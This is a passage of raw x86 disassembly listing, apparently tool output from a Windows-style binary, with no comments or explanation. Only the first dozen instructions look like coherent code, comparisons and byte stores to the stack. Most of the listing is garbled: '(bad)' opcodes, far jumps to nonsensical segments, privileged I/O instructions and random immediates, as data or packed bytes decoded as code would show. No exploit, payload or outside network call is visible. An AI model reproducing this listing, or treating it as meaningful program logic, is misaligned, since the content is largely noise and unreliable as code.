  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	cdq    
  41c93c:	das    
  41c93d:	outs   dx,DWORD PTR ds:[esi]
  41c93e:	mov    al,0xef
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0xc0181812
  41c948:	xor    DWORD PTR [ebx+0x2f],0x48
  41c94c:	pop    esi
  41c94d:	cdq    
  41c94e:	xor    DWORD PTR [esi+0x61033f62],ecx
  41c954:	ins    DWORD PTR es:[edi],dx
  41c955:	dec    ebx
  41c956:	sub    eax,0x2d4c67e2
  41c95b:	xor    DWORD PTR [ecx-0x5],ecx
  41c95e:	pop    edi
  41c95f:	lahf   
  41c960:	and    DWORD PTR [edi+0x62],esp
  41c963:	sbb    eax,0x67a711e9
  41c968:	ficom  DWORD PTR ds:0xc7ee4ecb
  41c96e:	pop    es
  41c96f:	call   0x3eac18e4
  41c974:	in     al,dx
  41c975:	std    
  41c976:	xchg   BYTE PTR [eax+0x30],ch
  41c979:	repz push ecx
  41c97b:	and    dh,bh
  41c97d:	inc    esp
  41c97e:	sub    dl,dl
  41c980:	imul   ecx,ebp,0x27
  41c983:	dec    edx
  41c984:	dec    ebx
  41c985:	mov    WORD PTR [ecx+0x4c],cs
  41c988:	xor    DWORD PTR [ebx+0x39b23224],ebx
  41c98e:	ror    BYTE PTR [ebp+0x3a],1
  41c991:	inc    ebp
  41c992:	retf   
  41c993:	add    al,0xd4
  41c995:	fsubr  DWORD PTR [ebp+0x51d8013b]
  41c99b:	sub    al,ch
  41c99d:	dec    esi
  41c99e:	lods   al,BYTE PTR ds:[esi]
  41c99f:	sbb    eax,0xda1082d0
  41c9a4:	cmp    bh,cl
  41c9a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a7:	retf   0xc903
  41c9aa:	jg     0x41c9cc
  41c9ac:	jmp    0x8b98:0x86b4ed7f
  41c9b3:	cld    
  41c9b4:	xchg   ebp,eax
  41c9b5:	mov    esi,0x4b2853e1
  41c9ba:	and    ah,dh
  41c9bc:	inc    ebp
  41c9bd:	int3   
  41c9be:	push   ebx
  41c9bf:	xchg   ebx,eax
  41c9c0:	mov    edi,DWORD PTR [esp+ebx*8-0x1e6cafea]
  41c9c7:	sbb    al,0x88
  41c9c9:	jmp    0x26214ce4
  41c9ce:	fiadd  DWORD PTR [bx+si-0x2c8d]
  41c9d3:	lock ret 
  41c9d5:	lods   eax,DWORD PTR ds:[esi]
  41c9d6:	(bad)  [eax+0x54]
  41c9d9:	retf   0xcb22
  41c9dc:	pop    ecx
  41c9dd:	loope  0x41c99f
  41c9df:	sbb    al,0x9b
  41c9e1:	(bad)  
  41c9e2:	fisub  DWORD PTR [edx+esi*4+0x45db3cba]
  41c9e9:	push   esp
  41c9ea:	lock in eax,dx
  41c9ec:	nop
  41c9ed:	jnp    0x41c98a
  41c9ef:	lods   eax,DWORD PTR ds:[esi]
  41c9f0:	icebp  
  41c9f1:	mov    edi,0xc7b2532b
  41c9f6:	les    eax,FWORD PTR ds:0x22fe2369
  41c9fc:	or     bl,cl
  41c9fe:	inc    ebp
  41c9ff:	add    eax,0x89773793
  41ca04:	and    bh,dl
  41ca06:	add    BYTE PTR [ebp-0x7f980134],0xa3
  41ca0d:	into   
  41ca0e:	mov    edx,0xdbda47d5
  41ca13:	xchg   ebx,eax
  41ca14:	cmp    eax,eax
  41ca16:	aaa    
  41ca17:	ins    BYTE PTR es:[edi],dx
  41ca18:	out    0xb3,al
  41ca1a:	cmp    al,0x4f
  41ca1c:	sub    eax,0x77d0b73d
  41ca21:	std    
  41ca22:	jg     0x41ca81
  41ca24:	aas    
  41ca25:	adc    ecx,ebx
  41ca27:	(bad)  
  41ca28:	adc    esp,DWORD PTR [eax]
  41ca2a:	xor    edx,ebx
  41ca2c:	sub    al,0xa4
  41ca2e:	or     cl,cl
  41ca30:	cmp    BYTE PTR [edi*1+0x67a2f474],bl
  41ca37:	mov    esp,0x27ec711
  41ca3c:	adc    al,BYTE PTR [eax+0x64]
  41ca3f:	test   eax,0x1743446f
  41ca44:	sbb    ebx,DWORD PTR [ecx-0xa712cc6]
  41ca4a:	cwde   
  41ca4b:	dec    ebp
  41ca4c:	add    al,0x73
  41ca4e:	std    
  41ca4f:	(bad)  
  41ca50:	std    
  41ca51:	ds xchg edi,eax
  41ca53:	cmp    BYTE PTR [ebx+0x28],0x4b
  41ca57:	mov    ecx,0xe95b3ddc
  41ca5c:	dec    esp
  41ca5d:	pop    eax
  41ca5e:	jmp    0x41cab1
  41ca60:	cs repnz test eax,ecx
  41ca64:	or     BYTE PTR [esi+0x1dc4f067],bh
  41ca6a:	les    esp,FWORD PTR [eax]
  41ca6c:	add    BYTE PTR [esi+0x71],cl
  41ca6f:	or     al,0x6d
  41ca71:	imul   edx,edi,0x5cf63d74
  41ca77:	loop   0x41cac2
  41ca79:	dec    eax
  41ca7a:	inc    eax
  41ca7b:	jle    0x41ca3c
  41ca7d:	mov    al,ds:0xd04046c5
  41ca82:	sub    al,0x5a
  41ca84:	lea    ebx,[esi-0x707fade2]
  41ca8a:	aaa    
  41ca8b:	jmp    0x6afc:0x34262c01
  41ca92:	in     eax,dx
  41ca93:	lahf   
  41ca94:	pop    ecx
  41ca95:	push   0xffffffd0
  41ca97:	(bad)  [esi+eax*4-0x239855a1]
  41ca9e:	cmp    al,0x34
  41caa0:	adc    edi,DWORD PTR [ecx]
  41caa2:	bound  edx,QWORD PTR [eax]
  41caa4:	ja     0x41ca85
  41caa6:	lds    edx,FWORD PTR [eiz*8+0x5ad02e37]
  41caad:	fnstsw WORD PTR [ebx]
  41caaf:	or     al,0xcb
  41cab1:	xor    ch,BYTE PTR [eax+0x20]
  41cab4:	sub    ecx,ecx
  41cab6:	jl     0x41ca3f
  41cab8:	dec    eax
  41cab9:	sbb    DWORD PTR ds:0x136c3a5f,0xccef83f3
  41cac3:	jmp    0x41ca7b
  41cac5:	jp     0x41cb2c
  41cac7:	sub    dl,cl
  41cac9:	into   
  41caca:	or     DWORD PTR [edx-0x67ca68d8],esp
  41cad0:	add    esi,ebp
  41cad2:	pop    ss
  41cad3:	and    eax,0xb5cee724
  41cad8:	inc    ebx
  41cad9:	lea    esp,[ebx-0x46]
  41cadc:	ins    BYTE PTR es:[edi],dx
  41cadd:	rcl    bl,0xd8
  41cae0:	sub    dl,BYTE PTR [edi-0x6c34172e]
  41cae6:	dec    ecx
  41cae7:	es add edi,edi
  41caea:	jle    0x41ca87
  41caec:	lea    esi,[edi]
  41caee:	cmp    edx,esi
  41caf0:	out    dx,al
  41caf1:	dec    esi
  41caf2:	imul   ebx,DWORD PTR [ebx-0x25594b31],0x7d619520
  41cafc:	xor    eax,0xf81cff
  41cb01:	inc    esi
  41cb02:	mov    DWORD PTR [ecx+edx*8-0x2f],ebp
  41cb06:	jae    0x41cb59
  41cb08:	or     DWORD PTR [eax-0x4acd6fd5],esi
  41cb0e:	xor    DWORD PTR [edi-0x56],esp
  41cb11:	in     al,dx
  41cb12:	dec    ch
  41cb14:	adc    eax,0x606ee7bc
  41cb19:	repz fadd QWORD PTR [esi]
  41cb1c:	inc    ebp
  41cb1d:	or     BYTE PTR [eax+0x57f8d3eb],0xec
  41cb24:	sub    al,0xf7
  41cb26:	adc    edx,esp
  41cb28:	jae    0x41cb4d
  41cb2a:	cmp    eax,0xe5040475
  41cb2f:	add    ecx,eax
  41cb31:	test   al,0x9a
  41cb33:	add    bl,cl
  41cb35:	jns    0x41cb0f
  41cb37:	mov    ch,0x40
  41cb39:	xor    ah,BYTE PTR [edx-0x47]
  41cb3c:	xchg   esi,eax
  41cb3d:	sbb    DWORD PTR [edx],ecx
  41cb3f:	neg    BYTE PTR [edx+0x24]
  41cb42:	pop    ecx
  41cb43:	mov    cl,0xdd
  41cb45:	sub    BYTE PTR [esp+ecx*2+0x11],ah
  41cb49:	pushf  
  41cb4a:	xchg   ebp,eax
  41cb4b:	xor    bh,BYTE PTR [ebp+0x70]
  41cb4e:	(bad)  
  41cb4f:	jne    0x41cb90
  41cb51:	in     eax,0xf
  41cb53:	jmp    0x41cb11
  41cb55:	mov    ebp,0x8bd32bb1
  41cb5a:	(bad)  
  41cb5b:	aaa    
  41cb5c:	addr16 jg 0x41cb46
  41cb5f:	(bad)  
  41cb60:	dec    edi
  41cb61:	sub    esi,DWORD PTR [ecx]
  41cb63:	sub    eax,0xa90ae12c
  41cb68:	cmp    BYTE PTR [edx],ch
  41cb6a:	xchg   esi,eax
  41cb6b:	adc    DWORD PTR [edi+0x7c],edi
  41cb6e:	int    0x8c
  41cb70:	cld    
  41cb71:	pop    es
  41cb72:	adc    eax,0x219dac1d
  41cb77:	hlt    
  41cb78:	mov    eax,0x29fc7fd7
  41cb7d:	cld    
  41cb7e:	inc    ebx
  41cb7f:	and    eax,0xc69b168f
  41cb84:	mov    al,ds:0xeda83a8
  41cb89:	adc    eax,0x5a571cb1
  41cb8e:	and    DWORD PTR ds:0x6930aff,ecx
  41cb94:	popa   
  41cb95:	mov    eax,ds:0xf41e8c69
  41cb9a:	ja     0x41cb4f
  41cb9c:	mov    ah,al
  41cb9e:	in     al,dx
  41cb9f:	push   edx
  41cba0:	test   eax,ebp
  41cba2:	fs push edx
  41cba4:	dec    edx
  41cba5:	cmp    dh,cl
  41cba7:	aas    
  41cba8:	pop    esp
  41cba9:	jecxz  0x41cba8
  41cbab:	dec    esi
  41cbac:	stc    
  41cbad:	bswap  esp
  41cbaf:	fs enter 0x14ac,0xa6
  41cbb4:	mov    bh,BYTE PTR [edi-0x7572522e]
  41cbba:	sub    eax,DWORD PTR [ecx+edx*4+0x54]
  41cbbe:	pmaddwd mm2,QWORD PTR [edi]
  41cbc1:	das    
  41cbc2:	sbb    esi,DWORD PTR [esi+0x7d]
  41cbc5:	pop    ebp
  41cbc6:	xchg   ebx,eax
  41cbc7:	and    DWORD PTR [eax+0x63304c6a],ebp
  41cbcd:	std    
  41cbce:	dec    esi
  41cbcf:	add    eax,0xbebfd078
  41cbd4:	scas   al,BYTE PTR es:[edi]
  41cbd5:	shl    DWORD PTR [esi-0x9],cl
  41cbd8:	pop    esi
  41cbd9:	and    eax,0x5cca06a0
  41cbde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbdf:	and    al,0x4
  41cbe1:	or     edi,DWORD PTR [ebp-0x5d]
  41cbe4:	cmp    al,BYTE PTR [ebx+edi*1]
  41cbe7:	fdiv   QWORD PTR [ebp+0x177c04dc]
  41cbed:	dec    eax
  41cbee:	in     eax,0x3c
  41cbf0:	mov    ch,0x3a
  41cbf2:	push   ds
  41cbf3:	clc    
  41cbf4:	jns    0x41cc35
  41cbf6:	jne    0x41cb8a
  41cbf8:	dec    ebp
  41cbf9:	push   esp
  41cbfa:	pop    esp
  41cbfb:	ins    BYTE PTR es:[edi],dx
  41cbfc:	adc    eax,edx
  41cbfe:	repnz data16 outs dx,BYTE PTR ds:[esi]
  41cc01:	popa   
  41cc02:	retf   0x3fc7
  41cc05:	add    al,0xb9
  41cc07:	popf   
  41cc08:	js     0x41cc87
  41cc0a:	jae    0x41cbf1
  41cc0c:	xchg   ebx,eax
  41cc0d:	(bad)  
  41cc0e:	clc    
  41cc0f:	rcr    dl,cl
  41cc11:	fidiv  WORD PTR [edx-0x51]
  41cc14:	add    al,0xf2
  41cc16:	mov    cl,0x66
  41cc18:	cli    
  41cc19:	mov    DWORD PTR [ecx-0x72409ef6],esi
  41cc1f:	lods   al,BYTE PTR ds:[esi]
  41cc20:	les    esp,FWORD PTR [ebp+0x2b]
  41cc23:	or     DWORD PTR [ebp-0x47],0xffffffa4
  41cc27:	cmp    eax,0x8188ed2c
  41cc2c:	mov    edi,DWORD PTR [edx+0x7d]
  41cc2f:	pusha  
  41cc30:	mul    ch
  41cc32:	mov    ecx,0x1c9942a0
  41cc37:	(bad)  
  41cc38:	jmp    0xa1d4:0xfd474064
  41cc3f:	push   esp
  41cc40:	arpl   si,bp
  41cc42:	int    0x7c
  41cc44:	iret   
  41cc45:	pusha  
  41cc46:	inc    esi
  41cc47:	lock stos BYTE PTR es:[edi],al
  41cc49:	sub    ebp,DWORD PTR [edi+0x75]
  41cc4c:	mov    esp,0xf44c6d69
  41cc51:	xchg   ecx,eax
  41cc52:	ss pop es
  41cc54:	sub    DWORD PTR es:[edx+0x27fbc135],eax
  41cc5b:	adc    BYTE PTR [eax-0x6431e43b],ah
  41cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc62:	not    DWORD PTR [edi]
  41cc64:	sbb    eax,DWORD PTR [ecx-0x68663df9]
  41cc6a:	jmp    0x8eb7f933
  41cc6f:	lahf   
  41cc70:	shl    BYTE PTR [ecx],1
  41cc72:	xchg   DWORD PTR [esi-0xb29894b],esp
  41cc78:	mov    edx,0x99532898
  41cc7d:	mov    dh,0xcc
  41cc7f:	lds    ebx,FWORD PTR [eax+ebp*8]
  41cc82:	(bad)  
  41cc83:	push   edi
  41cc84:	jnp    0x41cc87
  41cc86:	sub    ch,BYTE PTR [ecx+0x6c]
  41cc89:	jno    0x41cc64
  41cc8b:	fistp  WORD PTR [edx+eax*4-0x5e70fc9b]
  41cc92:	adc    al,ah
  41cc94:	enter  0xb885,0x26
  41cc98:	xchg   ecx,eax
  41cc99:	dec    ebx
  41cc9a:	ss shl ah,1
  41cc9d:	pop    esp
  41cc9e:	mov    ebp,0x27b992dd
  41cca3:	fisubr DWORD PTR [ebp+0xad3a2a6]
  41cca9:	jge    0x41cc6c
  41ccab:	loopne 0x41cd2a
  41ccad:	push   cs
  41ccae:	popa   
  41ccaf:	cmp    BYTE PTR [edi+0x74],bl
  41ccb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb3:	cld    
  41ccb4:	outs   dx,BYTE PTR ds:[esi]
  41ccb5:	out    0xd6,al
  41ccb7:	lahf   
  41ccb8:	(bad)  
  41ccb9:	xor    al,0x88
  41ccbb:	stos   BYTE PTR es:[edi],al
  41ccbc:	sub    eax,0xe0ab1d73
  41ccc1:	mov    bh,0xc2
  41ccc3:	aad    0xd4
  41ccc5:	inc    ebx
  41ccc6:	pop    edi
  41ccc7:	add    DWORD PTR [ecx+0x2728d398],ecx
  41cccd:	or     DWORD PTR [ecx],0x3e
  41ccd0:	jae    0x41cce2
  41ccd2:	lea    ebp,ds:0xe5c26164
  41ccd8:	add    esp,esi
  41ccda:	cmp    BYTE PTR [ecx+ebx*8],dl
  41ccdd:	popf   
  41ccde:	test   esp,ebx
  41cce0:	inc    ebx
  41cce1:	sub    BYTE PTR [edi],ah
  41cce3:	sbb    al,0xd5
  41cce5:	cmp    BYTE PTR [eax-0x44],dh
  41cce8:	stc    
  41cce9:	(bad)  
  41ccea:	cmp    BYTE PTR [ebx+0xc],dh
  41cced:	retf   
  41ccee:	jg     0x41cd2b
  41ccf0:	mov    BYTE PTR [ebx-0x7bf5f462],ch
  41ccf6:	fs in  al,dx
  41ccf8:	cmc    
  41ccf9:	mov    cl,BYTE PTR [esp+0x3c]
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xaa259afe
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x55e81818],bh
  41cd1e:	inc    eax
  41cd1f:	daa    
  41cd20:	loop   0x41cd9a
  41cd22:	test   DWORD PTR [esp+esi*1],0x3adf1e75
  41cd29:	sbb    eax,0xfa600be7
  41cd2e:	ins    BYTE PTR es:[edi],dx
  41cd2f:	or     DWORD PTR ds:0x2a4a8ddb,ebx
  41cd35:	aad    0xaa
  41cd37:	(bad)  
  41cd38:	ja     0x41cd38
  41cd3a:	jle    0x41cd15
  41cd3c:	xchg   BYTE PTR [edx+0x5b2a4065],ah
  41cd42:	aad    0x2e
  41cd44:	push   es
  41cd45:	je     0x41cd89
  41cd47:	inc    esp
  41cd48:	imul   esp,esp,0x8fdc3eeb
  41cd4e:	jl     0x41ccdb
  41cd50:	dec    edi
  41cd51:	adc    bh,BYTE PTR [ebx+0x3c]
  41cd54:	mov    gs,WORD PTR [ecx+0x69c0a861]
  41cd5a:	dec    ecx
  41cd5b:	scas   eax,DWORD PTR es:[edi]
  41cd5c:	pushf  
  41cd5d:	mov    ds:0x6c26e723,eax
  41cd62:	inc    edi
  41cd63:	iret   
  41cd64:	cdq    
  41cd65:	pop    ebp
  41cd66:	in     eax,dx
  41cd67:	push   es
  41cd68:	cmp    ecx,DWORD PTR [edi-0x7bcfac23]
  41cd6e:	(bad)  
  41cd6f:	rol    dl,cl
  41cd71:	mov    ax,ds:0x880446fe
  41cd77:	pop    edi
  41cd78:	shr    DWORD PTR ss:0x7893997e,0xd8
  41cd80:	pop    ds
  41cd81:	ret    
  41cd82:	test   al,0xf4
  41cd84:	rcl    DWORD PTR [ebx+0x1f],0xf0
  41cd88:	cmp    ebx,DWORD PTR [ebp+0x7]
  41cd8b:	pop    eax
  41cd8c:	bound  edx,QWORD PTR [edi+eiz*2]
  41cd8f:	ins    DWORD PTR es:[edi],dx
  41cd90:	push   esp
  41cd91:	xor    eax,0xd975b505
  41cd96:	sub    eax,0x3b6961f9
  41cd9b:	pop    ss
  41cd9c:	mov    al,cl
  41cd9e:	repz into 
  41cda0:	mov    esi,0x935b506f
  41cda5:	jl     0x41cd98
  41cda7:	jecxz  0x41cdbc
  41cda9:	je     0x41ce13
  41cdab:	jl     0x41cd61
  41cdad:	jo     0x41cdaf
  41cdaf:	sbb    ch,BYTE PTR [esi]
  41cdb1:	adc    al,0x60
  41cdb3:	mov    al,ds:0xd5058b1f
  41cdb8:	push   0x1f8cae89
  41cdbd:	(bad)  
  41cdbe:	inc    ebp
  41cdbf:	mov    WORD PTR [eax+0x38eb699f],es
  41cdc5:	add    eax,0x54ff0cf2
  41cdca:	inc    esi
  41cdcb:	test   DWORD PTR [ecx-0xd],edi
  41cdce:	adc    ebx,ebp
  41cdd0:	xor    ecx,DWORD PTR [edx]
  41cdd2:	cli    
  41cdd3:	mov    esp,ebp
  41cdd5:	lock xor dl,0xf3
  41cdd9:	sbb    BYTE PTR [ebx],dh
  41cddb:	pop    ebx
  41cddc:	adc    al,0x68
  41cdde:	cmpxchg DWORD PTR [esi+0x37],edx
  41cde2:	icebp  
  41cde3:	jnp    0x41cd84
  41cde5:	fst    DWORD PTR [esi-0x16a6551f]
  41cdeb:	and    BYTE PTR [esi+0x58],0x16
  41cdef:	jge    0x41ce5f
  41cdf1:	mov    ebx,0x7f6b68f4
  41cdf6:	(bad)  
  41cdf7:	sub    al,0xe7
  41cdf9:	out    dx,eax
  41cdfa:	mov    eax,ds:0x1c434933
  41cdff:	out    0x3e,al
  41ce01:	mov    eax,ds:0x625da830
  41ce06:	mov    dl,0x31
  41ce08:	aaa    
  41ce09:	dec    edx
  41ce0a:	addr16 mov ds:0x8884,eax
  41ce0e:	bnd ret 0x432a
  41ce12:	test   BYTE PTR [eax],0x9e
  41ce15:	cld    
  41ce16:	cwde   
  41ce17:	in     eax,0xd7
  41ce19:	push   ebp
  41ce1a:	dec    esp
  41ce1b:	test   eax,0xd91b0829
  41ce20:	and    DWORD PTR [ecx-0x178c8d9],esi
  41ce26:	es sub eax,0x7e5d8372
  41ce2c:	and    DWORD PTR [edi],ecx
  41ce2e:	adc    dl,BYTE PTR fs:[eax-0x45]
  41ce32:	retf   0xb960
  41ce35:	mov    esi,0x6fb1c9d1
  41ce3a:	add    dl,BYTE PTR [esi-0x1104742e]
  41ce40:	mov    ch,0xaa
  41ce42:	xchg   edi,eax
  41ce43:	xor    DWORD PTR [esi+0x21],ebp
  41ce46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce47:	mov    dl,0x82
  41ce49:	push   0x15
  41ce4b:	sub    ecx,ebp
  41ce4d:	ret    0xc6a0
  41ce50:	ret    
  41ce51:	cwde   
  41ce52:	sar    BYTE PTR ds:0x2acbbfb0,cl
  41ce58:	or     esi,DWORD PTR [ebx-0x39]
  41ce5b:	repz adc eax,DWORD PTR fs:[ecx]
  41ce5f:	in     al,dx
  41ce60:	pop    ebp
  41ce61:	sub    BYTE PTR [edx+0x5e5de7c2],cl
  41ce67:	gs mov eax,0x9fb95206
  41ce6d:	neg    DWORD PTR [esi-0x1536dda]
  41ce73:	pusha  
  41ce74:	adc    DWORD PTR [ebp-0x53cbdd99],eax
  41ce7a:	inc    edi
  41ce7b:	push   es
  41ce7c:	in     eax,dx
  41ce7d:	sbb    dh,bl
  41ce7f:	int3   
  41ce80:	es jmp 0xcd27b88d
  41ce86:	add    BYTE PTR [ecx],al
  41ce88:	push   esi
  41ce89:	or     DWORD PTR [ecx],edx
  41ce8b:	pop    es
  41ce8c:	cmp    ebp,DWORD PTR [eax+ecx*2+0x665148ba]
  41ce93:	cmp    bh,BYTE PTR [ebp-0x281242cc]
  41ce99:	dec    esp
  41ce9a:	dec    ebp
  41ce9b:	dec    ebp
  41ce9c:	dec    ebx
  41ce9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce9e:	inc    edx
  41ce9f:	repz jmp 0x4a10f109
  41cea5:	mov    DWORD PTR [ecx-0x7d4f9c89],esi
  41ceab:	inc    ecx
  41ceac:	jbe    0x41cea8
  41ceae:	(bad)  
  41ceaf:	je     0x41cea4
  41ceb1:	add    DWORD PTR [edx],edx
  41ceb3:	loopne 0x41ce6c
  41ceb5:	pxor   mm3,QWORD PTR [edi+0x5a]
  41ceb9:	pop    esi
  41ceba:	pop    ds
  41cebb:	pop    edx
  41cebc:	jmp    0x41cf09
  41cebe:	lahf   
  41cebf:	dec    bx
  41cec1:	and    dl,BYTE PTR [ebx+ebx*1]
  41cec4:	pop    esp
  41cec5:	or     DWORD PTR [ebp+0x1137580b],0x12
  41cecc:	dec    ebp
  41cecd:	(bad)  
  41cece:	outs   dx,BYTE PTR ds:[esi]
  41cecf:	fwait
  41ced0:	into   
  41ced1:	jle    0x41cf1f
  41ced3:	les    esi,FWORD PTR [edi]
  41ced5:	pop    esp
  41ced6:	les    esi,FWORD PTR [ecx+ecx*1-0x2cb849e4]
  41cedd:	inc    ebp
  41cede:	dec    eax
  41cedf:	jl     0x41cef0
  41cee1:	mov    eax,ds:0x54a511ad
  41cee6:	push   ebp
  41cee7:	call   0xec16:0x199e477
  41ceee:	inc    ebx
  41ceef:	lds    esi,FWORD PTR [ecx-0x4d]
  41cef2:	scas   al,BYTE PTR es:[edi]
  41cef3:	je     0x41cf33
  41cef5:	rcr    DWORD PTR [ecx],0x0
  41cef8:	sub    al,0x16
  41cefa:	mov    al,ds:0x88613234
  41ceff:	icebp  
  41cf00:	add    al,cl
  41cf02:	cmp    edi,eax
  41cf04:	mov    bl,0xb9
  41cf06:	ins    BYTE PTR es:[edi],dx
  41cf07:	adc    ebx,DWORD PTR [eax]
  41cf09:	test   DWORD PTR [eax+0x3a01699f],eax
  41cf0f:	push   ds
  41cf10:	xor    ch,BYTE PTR [edi-0x2311f78d]
  41cf16:	dec    ebp
  41cf17:	pop    edx
  41cf18:	inc    BYTE PTR [ebx-0x74318732]
  41cf1e:	mov    DWORD PTR ds:0xb4c1c557,0x75dd6d1a
  41cf28:	dec    esp
  41cf29:	inc    esi
  41cf2a:	mov    cl,0xe6
  41cf2c:	xchg   bl,ah
  41cf2e:	inc    ebx
  41cf2f:	lods   eax,DWORD PTR ds:[esi]
  41cf30:	lods   al,BYTE PTR ds:[esi]
  41cf31:	in     eax,0x25
  41cf33:	js     0x41cf1a
  41cf35:	scas   al,BYTE PTR es:[edi]
  41cf36:	adc    BYTE PTR [esi-0x67],bh
  41cf39:	push   ecx
  41cf3a:	imul   esi,esi,0xffffffe3
  41cf3d:	xor    al,0xcf
  41cf3f:	fucomp st(2)
  41cf41:	fist   WORD PTR [ecx]
  41cf43:	pop    ss
  41cf44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf45:	push   0x545facb9
  41cf4a:	pop    ebx
  41cf4b:	(bad)  
  41cf4c:	xor    esi,DWORD PTR [ebx+0x6058d320]
  41cf52:	test   DWORD PTR [esp+ebx*1+0x3c],ebp
  41cf56:	xchg   ecx,eax
  41cf57:	les    esi,FWORD PTR [ecx-0xd]
  41cf5a:	xchg   esi,eax
  41cf5b:	nop
  41cf5c:	xchg   ecx,eax
  41cf5d:	inc    edx
  41cf5e:	test   eax,0x35e0003a
  41cf63:	or     al,0xb4
  41cf65:	cmp    eax,0xd9f65c82
  41cf6a:	mov    esp,0x3e13d8d1
  41cf6f:	mov    BYTE PTR [eax+0x18],0x92
  41cf73:	in     al,0x8c
  41cf75:	in     al,dx
  41cf76:	leave  
  41cf77:	popa   
  41cf78:	or     al,0x80
  41cf7a:	mov    dl,0x8d
  41cf7c:	fadd   DWORD PTR [eax]
  41cf7e:	imul   edi,ebp,0x42
  41cf81:	scas   al,BYTE PTR es:[edi]
  41cf82:	lss    esp,FWORD PTR [eax+0x2ee56f27]
  41cf89:	adc    ecx,DWORD PTR [esi]
  41cf8b:	xor    ch,cl
  41cf8d:	cs popa 
  41cf8f:	repnz cmp DWORD PTR ds:0xe40d111b,edx
  41cf96:	cmp    al,BYTE PTR [ecx+0x28]
  41cf99:	xor    al,0x98
  41cf9b:	pop    es
  41cf9c:	jmp    0x7b8d:0xa2d67848
  41cfa3:	and    BYTE PTR [ebp-0x6f],0x84
  41cfa7:	mov    edx,0x3a1fce1b
  41cfac:	mov    dh,0x32
  41cfae:	scas   eax,DWORD PTR es:[edi]
  41cfaf:	outs   dx,DWORD PTR ds:[esi]
  41cfb0:	scas   al,BYTE PTR es:[edi]
  41cfb1:	retf   0xc4bb
  41cfb4:	outs   dx,BYTE PTR ds:[esi]
  41cfb5:	jle    0x41cf50
  41cfb7:	adc    al,0x6a
  41cfb9:	dec    eax
  41cfba:	es mov esp,0xa4d3b3d1
  41cfc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfc1:	dec    ecx
  41cfc2:	in     eax,dx
  41cfc3:	cwde   
  41cfc4:	int    0x5
  41cfc6:	imul   ebp,DWORD PTR [esi+edi*8-0x80],0xffffffd1
  41cfcb:	dec    edi
  41cfcc:	(bad)  
  41cfcd:	in     al,dx
  41cfce:	jge    0x41cf5d
  41cfd0:	rcr    BYTE PTR [ecx+ebp*2+0x67],1
  41cfd4:	mov    ebx,0xa0101c8d
  41cfd9:	idiv   DWORD PTR [ebx-0x340cae3e]
  41cfdf:	push   ebp
  41cfe0:	and    esp,0x1f
  41cfe3:	shl    DWORD PTR [ecx+0x68],1
  41cfe6:	jno    0x41d012
  41cfe8:	add    BYTE PTR [ebx-0x17],dh
  41cfeb:	mov    al,0xb5
  41cfed:	or     ecx,DWORD PTR [esi-0x5b1c558]
  41cff3:	ds inc ebp
  41cff5:	push   ds
  41cff6:	mov    es,WORD PTR [edx-0x27ce4fe4]
  41cffc:	inc    eax
  41cffd:	add    DWORD PTR [ebp-0x15fd082a],eax
  41d003:	scas   al,BYTE PTR es:[edi]
  41d004:	les    ebp,FWORD PTR ds:0x31d98780
  41d00a:	fld    st(5)
  41d00c:	ret    
  41d00d:	outs   dx,DWORD PTR ds:[esi]
  41d00e:	pop    es
  41d00f:	into   
  41d010:	into   
  41d011:	aad    0x22
  41d013:	fld    QWORD PTR [ecx+ecx*1+0x5a]
  41d017:	add    eax,0x1ffc36ee
  41d01c:	ret    
  41d01d:	adc    al,0xbe
  41d01f:	sbb    eax,0xf5ddcd12
  41d024:	leave  
  41d025:	enter  0x57ba,0x1c
  41d029:	retf   
  41d02a:	stos   BYTE PTR es:[edi],al
  41d02b:	fisub  DWORD PTR [edi+esi*1-0x46de18a9]
  41d032:	sbb    DWORD PTR [eax],ecx
  41d034:	clc    
  41d035:	inc    esp
  41d036:	mov    esp,DWORD PTR [ebp-0x45c452e2]
  41d03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d03d:	add    al,BYTE PTR [eax]
  41d03f:	bound  ecx,QWORD PTR [ecx-0x4e]
  41d042:	shl    DWORD PTR [eax+ecx*4+0x1b],1
  41d046:	lea    ecx,[ebp-0x5c86bd26]
  41d04c:	jge    0x41d07e
  41d04e:	mov    esi,0x485dfabb
  41d053:	(bad)  
  41d055:	cdq    
  41d056:	dec    eax
  41d057:	pop    edi
  41d058:	mov    bl,0x2
  41d05a:	call   0x4c01:0xc2436a0f
  41d061:	mov    bl,0x12
  41d063:	lods   al,BYTE PTR ds:[esi]
  41d064:	int3   
  41d065:	leave  
  41d066:	pop    ebp
  41d067:	pop    ds
